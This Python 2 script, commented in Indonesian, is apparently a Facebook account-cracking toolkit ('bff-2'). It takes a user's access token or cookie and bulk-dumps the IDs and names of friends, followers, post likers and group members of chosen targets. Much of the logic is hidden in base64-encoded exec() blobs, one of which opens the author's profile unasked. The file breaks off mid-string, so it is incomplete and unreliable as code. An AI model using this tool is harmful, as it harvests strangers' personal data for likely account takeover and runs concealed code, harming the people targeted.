# coding=utf-8
# coding by Romi Afrizal
# Note : jangan di ubah lagi! nanti error, script udah enak

Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
 • Info script :
 	
 - author      : Yumasaa
 - facebook    : https://www.facebook.com/profile.php?id=100071694021818
 - fanspage    : -
 - whatsap     : +6283801923083
 - github      : github.com/Ndrii-Sanz
 - script name : bff-2
 - version     : 1.1
 
%s"""%(Hj,Mt))

import os
try:
    import requests
except ImportError:
    print '\n• modul requests belum terinstall \n'
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    print '\n• modul futures belum terinstall \n'
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    print '\n• modul bs4 belum terinstall \n'
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64, marshal
from concurrent.futures import ThreadPoolExecutor as Lampung
from datetime import datetime
from bs4 import BeautifulSoup 
from time import sleep as jeda
exec(base64.b64decode('Y3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbjEgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCmJ1bGFuID0gWydKYW51YXJpJywgJ0ZlYnJ1YXJpJywgJ01hcmV0JywgJ0FwcmlsJywgJ01laScsICdKdW5pJywgJ0p1bGknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2t0b2JlcicsICdOb3ZlbWJlcicsICdEZXNlbWJlciddDQp0cnk6DQogICAgaWYgbiA8IDAgb3IgbiA+IDEyOg0KICAgICAgICBleGl0KCkNCiAgICBuVGVtcCA9IG4gLSAxDQpleGNlcHQgVmFsdWVFcnJvcjoNCiAgICBleGl0KCkNCg0KY3VycmVudCA9IGRhdGV0aW1lLm5vdygpDQp0YSA9IGN1cnJlbnQueWVhcg0KYnUgPSBjdXJyZW50Lm1vbnRoDQpoYSA9IGN1cnJlbnQuZGF5DQpvcCA9IGJ1bGFuW25UZW1wXQ0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCiMgS1VNUFVMQU4gV0FSTkENCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENClAgPSAnXHgxYlsxOzk3bScgIyBQVVRJSA0KTiA9ICdceDFiWzBtJyAjIFdBUk5BIE1BVEkNCmFjYWsgPSBbTSwgSCwgSywgQiwgVSwgTywgUF0NCndhcm5hID0gcmFuZG9tLmNob2ljZShhY2FrKQ0KdGlsID0i4oCiIg=='))

ok = []
cp = []
id = []
user = []
loop = 0

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)

def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s menghapus token %s'%(M,til,o)),
        sys.stdout.flush();jeda(1)

# LOGO (LO GOBLOK)
ip = requests.get('https://api.ipify.org').text
exec(base64.b64decode('YXV0aG9yID0iUm9taSBBZnJpemFsIgpmYl9tZSA9ImZhY2Vib29rLmNvbS9yb21pLmFmcml6YWwuMTAyIgpnaXRodWIgPSJnaXRodWIuY29tL01hcmstWnVjayI='))
def banner():
    print (' %s%s%s%s%s%s                                      %s%s%s%s%s%s\n%s   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n%s   |_____  |    \\_ |     | |_____  |    \\_\n\n     %s    %s %sCoded by %s: %s%s %s%s   \n %s%s%s%s%s%s                                      %s%s%s%s%s%s \n %s# %sFb  %s : %s%s \n %s# %sGit%s  : %s%s \n %s# %s---------------------------------------- %s#  '%
    (M,til,K,til,H,til,M,til,K,til,H,til,M,P,U,til,K,M,K,author,U,til,M,til,K,til,H,til,M,til,K,til,H,til,U,O,M,O,fb_me,U,O,M,O,github,P,M,P))
    print (' %s#%s IP   %s:%s %s%s '%(U,O,M,O,ip,M))
    
# MASUK TOKEN (TOKEN LISTRIK)
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    print ('\n%s%s%s 01 %sLogin via token \n%s%s%s 02%s Cara mendapatkan token \n%s%s%s 00 %sKeluar'%(U,til,K,O,U,til,K,O,U,til,M,O))
    kontol = raw_input ("\n%s# %sPilih %s> %s"%(P,O,M,K))
    if kontol in(""):
    	print("%s%s wrong input "%(M,til));exit()
    elif kontol in ('1','01'):
    	romz = raw_input("\n%s# %sToken %s> %s"%(P,O,M,K))
        if romz in(""):
        	print ("%s%s isi token kentod "%(M,til))
    	try:
            nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s%s Login succes, mohon tunggu '%(H,til));jeda(2)
            open('data/token.txt', 'w').write(romz);login_xx()
            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
        except (KeyError,IOError):
        	print ("%s%s Token invalid "%(M,til));jeda(2);masuk()
    elif kontol in ('2', '02'):
    	print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
        print (" - siapkan akun facebook (wajib akun tumbal)");jeda(2)
        print (" - loginkan akun facebook (tumbal) di browser %sChrome %s"%(O,H));jeda(2)
        print (" - url alamat wajib %shttps://m.facebook.com %s(mode data)"%(O,H));jeda(2)
        print (" - salin link : %shttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_"%(O));jeda(2)
        print ("%s - taruh link tersebut di url alamat facebook lalu klik cari "%(H));jeda(2)
        print (" - jika sudah, klik %stitik tiga %spojok kanan atas "%(O,H));jeda(2)
        print (" - kemudian klik %sCari di Halaman %s"%(O,H));jeda(2)
        print (" - ketik %sEAAAA %sakan muncul acces token."%(O,H));jeda(2)
        print (" - jika sudah jangan lupa di salin \n");jeda(2)
        nanya = raw_input('%s%s%s Anda paham? %sy%s/%sn :%s '%(U,til,O,H,O,M,K))
        if nanya in(""):
        	print ("%s%s saya bertanya wajib di jawab "%(M,til));jeda(2);masuk()
        elif nanya in("y","Y"):
        	print ("\n%s%s selamat anda pintar :* "%(H,til));jeda(2);masuk()
        elif nanya in("n","N"):
        	print ("\n%s%s anda sungguh tolol "%(M,til));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
    elif kontol in ('0', '00'):
    	exit()
    else:
    	print("%s%s wrong input "%(M,til));exit()
    
# MASUK COOKIE (KUEH ENAK)
host = ('https://mbasic.facebook.com')
ua = ("Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36")
h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return cvd(open('.cok').read().strip())
		else:gen()
	else:gen()
  
def gen(show=True):
	if show==True:
		#os.system("clear")
		#banner()
		print("\n%s%s%s Supaya bekerja masukan cookie facebook anda"%(U,til,O))
	ck=raw_input("%s# %sCookie %s> %s"%(P,O,M,K))
	if ck=="":gen(show=False)
	try:
		cks=cvd(ck)
		if lang(cks)==True:
			open(".cok","w").write(ck);exit("%s%s login success, ketik: python2 bff-2.py "%(H,til))
		else:print("%s%s login gagal."%(M,til));gen(show=True)
	except Exception as e:
		print("%s%s error : %s\n"%(M,til,e))
		gen(show=False)
		
def lang(cookies):
	f=False
	b=requests.get("https://mbasic.facebook.com/profile.php",headers={'origin': 'https://mbasic.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', 'https://mbasic.facebook.com')), 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'},cookies=cookies).text	
	if "mbasic_logout_button" in b.lower():
		f=True
		if f==True:
			return True
		else:
				exit("%s%s login gagal. "%(M,til))
				
def hdcok():
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r

def cvs(cookies): # convert cookie dict to string
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)
	
def cvd(cookies): # convert cookie dict to string
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

# PUBLIK
def publik(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s%s %sKetik '%sme%s' jika ingin dump daftar teman sendiri "%(U,til,O,H,O))
        idt = raw_input('%s%s %sTarget id%s > %s'%(U,til,O,M,K))
        simpan = raw_input('%s%s%s Nama file%s > %s'%(U,til,O,M,K))
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        qq = ('dump/' + simpan + '.json').replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s%s%s mengumpulkan id%s >%s %s ' % (U,til,O,M,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)

        ys.close()
        print ('\n\n%s%s Succes dump id publik '%(H,til))
        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,qq))
        raw_input('\n%s%s%s Kembali '%(U,til,O))
        menu()
    except Exception as e:
        exit('\n%s%s Failed dump id'%(M,til))
       
# FOLLOWERS
def followers(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s%s %sKetik '%sme%s' jika ingin dump followers sendiri "%(U,til,O,H,O))
        idt = raw_input('%s%s %sTarget id%s  > %s'%(U,til,O,M,K))
        batas = raw_input('%s%s %sMaximal id%s > %s'%(U,til,O,M,K))
        simpan = raw_input('%s%s%s Nama file%s  > %s'%(U,til,O,M,K))
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
        id = []
        z = json.loads(r.text)
        qq = ('dump/' + simpan + '.json').replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            print ('\r%s%s%s mengumpulkan id%s >%s %s ' % (U,til,O,M,H,str(len(id)))),
            sys.stdout.flush();jeda(0.0050)

        ys.close()
        print ('\n\n%s%s Succes dump id followers '%(H,til))
        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,qq))
        raw_input('\n%s%s%s Kembali '%(U,til,O))
        menu()
    except Exception as e:
        exit('\n%s%s Failed dump id'%(M,til))
   
# POSTINGAN 
def postingan(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s%s %sPerlu di ingat postingan harus bersifat publik "%(U,til,O))
        idt = raw_input('%s%s %sId post%s   > %s'%(U,til,O,M,K))
        simpan = raw_input('%s%s%s Nama file%s > %s'%(U,til,O,M,K))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        qq = ('dump/' + simpan + '.json').replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s%s%s mengumpulkan id%s >%s %s ' % (U,til,O,M,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)

        ys.close()
        print ('\n\n%s%s Succes dump id postingan '%(H,til))
        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,qq))
        raw_input('\n%s%s%s Kembali '%(U,til,O))
        menu()
    except Exception as e:
        exit('\n%s%s Failed dump id'%(M,til))

exec(base64.b64decode('Y2xhc3MgZHVtcF9ncnVwOgoJZGVmIF9faW5pdF9fKHNlbGYsIGNvb2tpZXMpOgoJCXNlbGYuZ2xpc3Q9W10KCQlzZWxmLmNvb2tpZXM9Y29va2llcwoJCXNlbGYuZXh0cmFjdCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2dyb3Vwcy8/c2VlbW9yZSIpCgkJCglkZWYgZXh0cmFjdChzZWxmLCB1cmwpOgoJCWJzPWJzNC5CZWF1dGlmdWxTb3VwKHJlcXVlc3RzLmdldCh1cmwsIGNvb2tpZXM9c2VsZi5jb29raWVzLGhlYWRlcnM9aGRjb2soKSkudGV4dCwiaHRtbC5wYXJzZXIiKQoJCWZvciBpIGluIGJzLmZpbmRfYWxsKCJhIixocmVmPVRydWUpOgoJCQlpZiAiL2dyb3Vwcy8iIGluIGkuZ2V0KCJocmVmIik6CgkJCQlpZiAiY2F0ZWdvcnkiIGluIGkuZ2V0KCJocmVmIikgb3IgImNyZWF0ZSIgaW4gaS5nZXQoImhyZWYiKToKCQkJCQljb250aW51ZQoJCQkJZWxzZToKCQkJCQlzZWxmLmdsaXN0LmFwcGVuZCh7ImlkIjoiIi5qb2luKGJzNC5yZS5maW5kYWxsKCIvZ3JvdXBzLyguKj8pXD8iLGkuZ2V0KCJocmVmIikpKSwibmFtZSI6aS50ZXh0fSkKCQlpZiBsZW4oc2VsZi5nbGlzdCkgIT0wOgoJCQlwcmludCgiICIpCgkJCXByaW50KCIlcyVzJXMgS2FtdSBwdW55YSAlcyBncm91cCBkaSB0ZW11a2FuIiVVLHRpbCxPLGxlbihzZWxmLmdsaXN0KSkKCQkJcHJpbnQgKCIlcyVzJXMgMDEgJXNEYXBhdGthbiBncnVwIGRlbmdhbiBtZW5jYXJpIG5hbWEiJVUsdGlsLFAsTykKCQkJcHJpbnQgKCIlcyVzJXMgMDIgJXNNYXN1a2FuIGlkIGdydXAgKG1hbnVhbClcbiIlVSx0aWwsUCxPKQoJCQl3aGlsZSBUcnVlOgoJCQkJcm9taV89cmF3X2lucHV0KCIlcyMgJXNQaWxpaCAlcz4gJXMiJVAsTyxNLEspCgkJCQlpZiByb21pXz09IiI6Y29udGludWUKCQkJCWVsaWYgcm9taV8gaW4oIjEiLCIwMSIpOgoJCQkJCXNlbGYuc2VhcmNoKCkKCQkJCQlleGl0KCkKCQkJCWVsaWYgcm9taV8gaW4oIjIiLCIwMiIpOgoJCQkJCXNlbGYubWFudWFsKCkKCQkJCQlleGl0KCkKCQkJCWVsc2U6CgkJCQkJcHJpbnQoIiVzJXMgd3JvbmcgaW5wdXQuIiVNLHRpbCkKCQllbHNlOmV4aXQoIiVzJXMgbm8gZ3JvdXBzIGZvdW5kLiIlTSx0aWwpCgkJCglkZWYgbWFudWFsKHNlbGYpOgoJCWlkPXJhd19pbnB1dCgiXG4lcyVzJXMgSWQgZ3JvdXAlcyA6ICVzIiVVLHRpbCxPLE0sSykKCQlpZiBpZD09IiI6CgkJCXNlbGYubWFudWFsKCkKCQllbHNlOgoJCQlyPWJzNC5CZWF1dGlmdWxTb3VwKHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2dyb3Vwcy8iK2lkLGhlYWRlcnM9aGRjb2soKSxjb29raWVzPXNlbGYuY29va2llcykudGV4dCwiaHRtbC5wYXJzZXIiKQoJCQlpZiAia29udGVuIHRpZGFrIiBpbiByLmZpbmQoInRpdGxlIikudGV4dC5sb3dlcigpOgoJCQkJZXhpdCgiJXMlcyBpbnB1dCBpZCBncnVwIHlnIHZhbGlkIGdvYmxvaywgaWQgZXJyb3IsIGF0YXUgbHUgYmVsb20gam9vaW4gZGkgZ3J1cCIlTSx0aWwpCgkJCWVsc2U6CgkJCQlzZWxmLmxpc3RlZD17ImlkIjppZCwibmFtZSI6ci5maW5kKCJ0aXRsZSIpLnRleHR9CgkJCQlzZWxmLmYoKQoJCQkJcHJpbnQoIiVzJXMlcyBOYW1hIGdydXAlcyA+ICVzJXMuLiIlKFUsdGlsLE8sTSxILHNlbGYubGlzdGVkLmdldCgibmFtZSIpWzA6MjBdKSkKCQkJCXNlbGYuZHVtcHMoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9ncm91cHMvIitpZCkKCQoJZGVmIHNlYXJjaChzZWxmKToKCQl3aGl0ZWxpc3Q9W10KCQlxPXJhd19pbnB1dCgnJXMlcyVzIHF1ZXJ5ICVzPiAlcyclVSx0aWwsTyxNLEspLmxvd2VyKCkKCQlpZiBxPT0nJzpzZWxmLnNlYXJjaCgpCgkJZWxzZToKCQkJcHJpbnQoIiIpCgkJCWZvciBlLGkgaW4gZW51bWVyYXRlKHNlbGYuZ2xpc3QpOgoJCQkJaWYgcSBpbiBpLmdldCgibmFtZSIpLmxvd2VyKCk6CgkJCQkJd2hpdGVsaXN0LmFwcGVuZChpKQoJCQkJCXByaW50KCcgICVzLiAlcyclKGxlbih3aGl0ZWxpc3QpLGkuZ2V0KCJuYW1lIikubG93ZXIoKS5yZXBsYWNlKHEsIiVzJXMlcyIlKEgscSxOKSkpKQoJCQlpZiBsZW4od2hpdGVsaXN0KT09MDoKCQkJCXByaW50KCIlcyVzIG5vIHJlc3VsdCBmb3VuZCB3aXRoIHRoaXMgcXVlcnk6ICVzIiVNLHRpbCxxKQoJCQkJc2VsZi5zZWFyY2goKQoJCQllbHNlOgoJCQkJcHJpbnQoJycpO3NlbGYuY2hvaWNlKHdoaXRlbGlzdCkKCQoJZGVmIGNob2ljZShzZWxmLCB3aGl0ZWxpc3QpOgoJCXRyeToKCQkJc2VsZi5saXN0ZWQ9d2hpdGVsaXN0W2lucHV0KCIlcyMgJXNQaWxpaCBncm91cCVzID4lcyAiJVUsdGlsLE8sTSxLKS0xXQoJCQlzZWxmLmYoKQoJCQlwcmludCgiJXMlcyVzIE5hbWEgZ3J1cCAlcz4gJXMlcyIlKFUsdGlsLE8sTSxILHNlbGYubGlzdGVkLmdldCgibmFtZSIpKSkKCQkJc2VsZi5kdW1wcygiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2dyb3Vwcy8iK3NlbGYubGlzdGVkLmdldCgiaWQiKSkKCQlleGNlcHQgRXhjZXB0aW9uIGFzIGU6CgkJCXByaW50KCJceDFiWzE7OTFt4oCiICVzIiVlKTtzZWxmLmNob2ljZSh3aGl0ZWxpc3QpCgkKCWRlZiBmKHNlbGYpOgoJCXNlbGYuZmw9cmF3X2lucHV0KCclcyVzJXMgTmFtYSBmaWxlICVzPiAlcyclVSx0aWwsTyxNLEspLnJlcGxhY2UoIiAiLCJfIikKCQlpZiBzZWxmLmZsPT0nJzpzZWxmLmYoKQoJCW9wZW4oc2VsZi5mbCwidyIpLmNsb3NlKCkKCQoJZGVmIGR1bXBzKHNlbGYsIHVybCk6CgkJcj1iczQuQmVhdXRpZnVsU291cChyZXF1ZXN0cy5nZXQodXJsLGNvb2tpZXM9c2VsZi5jb29raWVzLGhlYWRlcnM9aGRjb2soKSkudGV4dCwiaHRtbC5wYXJzZXIiKQoJCXByaW50KCJcciVzJXMlcyBTZWRhbmcgZHVtcCBpZCAlcz4gJXMlcyBceDFiWzE7OTdtLSBceDFiWzE7OTZtQ1RSTCtaIGZvciBzdG9wIiVVLHRpbCxPLE0sSCxsZW4ob3BlbihzZWxmLmZsKS5yZWFkKCkuc3BsaXRsaW5lcygpKSksO3N5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDAuMDA1MCkKCQlmb3IgaSBpbiByLmZpbmRfYWxsKCJoMyIpOgoJCQl0cnk6CgkJCQlpZiBsZW4oYnM0LnJlLmZpbmRhbGwoIlwvIixpLmZpbmQoImEiLGhyZWY9VHJ1ZSkuZ2V0KCJocmVmIikpKT09MToKCQkJCQlvZ2VoPWkuZmluZCgiYSIsaHJlZj1UcnVlKQoJCQkJCWlmICJwcm9maWxlLnBocCIgaW4gb2dlaC5nZXQoImhyZWYiKToKCQkJCQkJYT0iIi5qb2luKGJzNC5yZS5maW5kYWxsKCJwcm9maWxlXC5waHBcP2lkPSguKj8pJiIsb2dlaC5nZXQoImhyZWYiKSkpCgkJCQkJCWlmIGxlbihhKT09MDpjb250aW51ZQoJCQkJCQllbGlmIGEgaW4gb3BlbihzZWxmLmZsKS5yZWFkKCk6CgkJCQkJCQljb250aW51ZQoJCQkJCQllbHNlOgoJCQkJCQkJb3BlbihzZWxmLmZsLCJhKyIpLndyaXRlKCIlczxSb21pQWZyaXphbD4lc1xuIiUoYSxvZ2VoLnRleHQpKQoJCQkJCQkJY29udGludWUKCQkJCQllbHNlOgoJCQkJCQlhPSIiLmpvaW4oYnM0LnJlLmZpbmRhbGwoIi8oLio/KVw/IixvZ2VoLmdldCgiaHJlZiIpKSkKCQkJCQkJaWYgbGVuKGEpPT0wOmNvbnRpbnVlCgkJCQkJCWVsaWYgYSBpbiBvcGVuKHNlbGYuZmwpLnJlYWQoKToKCQkJCQkJCWNvbnRpbnVlCgkJCQkJCWVsc2U6CgkJCQkJCQlvcGVuKHNlbGYuZmwsImErIikud3JpdGUoIiVzPD0+JXNcbiIlKGEsb2dlaC50ZXh0KSkKCQkJZXhjZXB0OmNvbnRpbnVlCgkJZm9yIGkgaW4gci5maW5kX2FsbCgiYSIsaHJlZj1UcnVlKToKCQkJaWYgIkxpaGF0IFBvc3RpbmdhbiBMYWlubnlhIiBpbiBpLnRleHQ6CgkJCQl3aGlsZSBUcnVlOgoJCQkJCXRyeToKCQkJCQkJc2VsZi5kdW1wcygiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLyIraS5nZXQoImhyZWYiKSkKCQkJCQkJYnJlYWsKCQkJCQlleGNlcHQgRXhjZXB0aW9uIGFzIGU6CgkJCQkJCXByaW50KCJcclx4MWJbMTs5MW3igKIlcywgcmV0cnlpbmcuLi4iJWUpO2NvbnRpbnVlCgkJZXhpdCgiXG4lcyVzIHlvdSBhcmUgc3VjY2Vzc2Z1bGx5IGR1bXAgJXMgaWQgZnJvbSBncm91cCAlcyAuLiIlKEgsdGlsLGxlbihvcGVuKHNlbGYuZmwpLnJlYWQoKS5zcGxpdGxpbmVzKCkpLHNlbGYubGlzdGVkLmdldCgibmFtZSIpWzA6MjBdKSkKCmRlZiBjZWsoYXJnKToKCWlmIG9zLnBhdGguZXhpc3RzKCIuY29rIik6CgkJaWYgb3MucGF0aC5nZXRzaXplKCIuY29rIikgIT0wOgoJCQlyZXR1cm4gVHJ1ZQoJCWVsc2U6cmV0dXJuIEZhbHNlCgllbHNlOnJldHVybiBGYWxzZQ=='))
	
exec(base64.b64decode('ZGVmIGR1bXBmbCgpOgogICAgY3ZkcyA9IE5vbmUKICAgIGNvb2tpZSA9IE5vbmUKICAgIG5ldyA9IE5vbmUKICAgIGlmIGNlaygxKSA9PSBGYWxzZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGNvb2tpZSA9IHJhd19pbnB1dCgiXG4lcyVzJXMgU3VwYXlhIGJla2VyamEgbWFzdWthbiBjb29raWUgZmFjZWJvb2sgYW5kYVxuJXMjICVzQ29va2llJXMgPiAlcyIlKFUsdGlsLE8sUCxPLE0sSykpCiAgICAgICAgICAgIGN2ZHMgPSBjdmQoY29va2llKQogICAgICAgICAgICBuZXcgPSBUcnVlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgiXHgxYlsxOzkxbeKAoiBpbnZhbGlkIGNvb2tpZSIpO2R1bXBmbCgpCiAgICBlbHNlOgogICAgICAgIGN2ZHMgPSBjdmQob3BlbignLmNvaycpLnJlYWQoKS5zdHJpcCgpKQogICAgciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwJywgY29va2llcz1jdmRzLCBoZWFkZXJzPWhkY29rKCkpLnRleHQKICAgIGlmIGxlbihiczQucmUuZmluZGFsbCgnbG9nb3V0JywgcikpICE9IDA6CiAgICAgICAgaWYgbGFuZyhjdmRzKSAhPSBUcnVlOgogICAgICAgICAgICBleGl0KCIlcyVzIGdhZ2FsIHNhYXQgbWVuZGV0ZWtzaSBiYWhhc2EuIiUoTSx0aWwpKQogICAgICAgIHByaW50KCJcbiVzJXMlcyBMb2dpbiBhcyVzID4gJXMlcy4uIiUoVSx0aWwsTyxNLEgsYnM0LkJlYXV0aWZ1bFNvdXAociwiaHRtbC5wYXJzZXIiKS5maW5kKCJ0aXRsZSIpLnRleHRbMDoxMF0pKQogICAgICAgIGlmIG5ldyA9PSBUcnVlOgogICAgICAgICAgICBvcGVuKCcuY29rJywgJ3cnKS53cml0ZShjb29raWUpCiAgICAgICAgZmw9cmF3X2lucHV0KCJcbiVzJXMlcyBOYW1hIGZpbGUgICAgJXM+JXMgIiUoVSx0aWwsTyxNLEspKS5yZXBsYWNlKCIgIiwiXyIpCiAgICAgICAgcHJpbnQgKCIlcyVzJXMgQ29udG9oIG5hbWEgJXMoJXNTdWdpb25vJXMpIiUoVSx0aWwsTyxQLEgsUCkpCiAgICAgICAgcz1yYXdfaW5wdXQoIiVzJXMlcyBNYXN1a2FuIG5hbWEgJXM+ICVzIiVVLHRpbCxPLE0sSykKICAgICAgICBuYW1haChmbCxjdmRzLCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vc2VhcmNoL3Blb3BsZS8/cT0iK3MpCiAgICBlbHNlOgogICAgICAgIHRyeToKICAgICAgICAgICAgb3MucmVtb3ZlKCcuY29rJykKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgICAgICBwcmludCAnXHgxYlsxOzkxbeKAoiBsb2dpbiBmYWlsIScKICAgICAgICBkdW1wZmwoKQogICAgcmV0dXJuCgpkZWYgbmFtYWgoZmwscixiKToKCW9wZW4oZmwsImErIikKCWI9YnM0LkJlYXV0aWZ1bFNvdXAocmVxdWVzdHMuZ2V0KGIsIGNvb2tpZXM9cixoZWFkZXJzPWhkY29rKCkpLnRleHQsImh0bWwucGFyc2VyIikKCWZvciBpIGluIGIuZmluZF9hbGwoImEiLGhyZWY9VHJ1ZSk6CgkJI2NsZWFyKCkKCQkjYmFubmVyKCkKCQlwcmludCAiXHIlcyVzJXMgU2VkYW5nIGR1bXAgaWQgJXM+ICVzJXNceDFiWzE7OTdtIC0gXHgxYlsxOzk2bUNUUkwrWiBmb3Igc3RvcCIlKFUsdGlsLE8sTSxILGxlbihvcGVuKGZsKS5yZWFkKCkuc3BsaXRsaW5lcygpKSksO3N5cy5zdGRvdXQuZmx1c2goKQoJCWlmICI8aW1nIGFsdD0iIGluIHN0cihpKToKCQkJaWYgImhvbWUucGhwIiBpbiBzdHIoaVsiaHJlZiJdKToKCQkJCWNvbnRpbnVlCgkJCWVsc2U6CgkJCQlnPXN0cihpWyJocmVmIl0pCgkJCQlpZiAicHJvZmlsZS5waHAiIGluIGc6CgkJCQkJbmFtZT1pLmZpbmQoImltZyIpLmdldCgiYWx0IikucmVwbGFjZSgiLCBwcm9maWxlIHBpY3R1cmUiLCIiKQoJCQkJCWQ9YnM0LnJlLmZpbmRhbGwoIi9wcm9maWxlXC5waHBcP2lkPSguKj8pJiIsZykKCQkJCQlpZiBsZW4gKGQpICE9MDoKCQkJCQkJcGs9IiIuam9pbihkKQoJCQkJCQlpZiBwayBpbiBvcGVuKGZsKS5yZWFkKCk6CgkJCQkJCQlwYXNzCgkJCQkJCWVsc2U6CgkJCQkJCQlvcGVuKGZsLCJhKyIpLndyaXRlKCIlczxSb2